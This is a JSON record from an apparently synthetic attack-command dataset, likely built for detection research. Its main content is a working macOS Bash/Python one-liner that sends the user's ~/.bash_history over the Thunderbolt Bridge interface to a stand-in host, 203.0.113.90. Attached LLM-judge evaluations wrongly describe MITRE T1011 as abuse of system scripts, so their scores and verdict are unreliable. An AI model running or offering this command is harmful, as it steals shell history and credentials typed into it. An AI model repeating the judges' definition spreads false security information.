{
  "technique_id": "T1011",
  "platform": "macOS",
  "shell": "Bash",
  "command": "IP=\"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\"; python3 -c \"import socket; s=socket.socket(); s.bind(('\"$IP\"',0)); s.connect(('203.0.113.90',54921)); s.sendall(open('/Users/$USER/.bash_history','rb').read()); s.close()\"",
  "explanation": "Executes a Python TCP client bound to the Thunderbolt Bridge IP to exfiltrate content over a non-primary interface, consistent with T1011.",
  "rationale_steps": [
    "Get Thunderbolt Bridge IP via networksetup",
    "Bind a user-space TCP socket to that IP",
    "Send file content to a high, uncommon port"
  ],
  "obfuscation_level": "none",
  "id": "SYN-BASH-T1011-641961f7-6b36bb00",
  "source_prompt_hash": "641961f7",
  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid variable assignment, correct awk syntax, and properly structured Python code with appropriate quoting and escaping.",
        "semantic_score": 4,
        "semantic_justification": "The command effectively implements exfiltration over a non-standard network interface (Thunderbolt Bridge) by retrieving the IP, binding to it, and sending bash history to a remote server, though it doesn't fully align with T1011 which focuses on abusing trusted system scripts rather than direct Python execution.",
        "combined_score": 4.5,
        "confidence": 0.9,
        "timestamp": "2025-10-02T04:33:15.747768Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, with correct command substitution, proper quoting for both shell and embedded Python, and valid syntax for all utilities and the Python script.",
        "semantic_score": 2,
        "semantic_justification": "The command performs plausible exfiltration using Python as a script host, but it does not align with T1011's core concept of abusing legitimate *system scripts* to proxy execution, instead using Python to directly execute the malicious payload.",
        "combined_score": 3.5,
        "confidence": 1,
        "timestamp": "2025-10-02T04:33:24.273616Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "Quoting, command substitution, and Python snippet are balanced and concatenate correctly, yielding a parseable one-liner.",
        "semantic_score": 2,
        "semantic_justification": "While it plausibly exfiltrates data via a TCP socket bound to a specific interface, it does not use a trusted/signed system script proxy as described by the technique, so it is misaligned.",
        "combined_score": 3.5,
        "confidence": 0.78,
        "timestamp": "2025-10-02T04:34:12.879600Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 2.667,
    "llm_average_score": 3.833,
    "llm_verdict": "uncertain",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}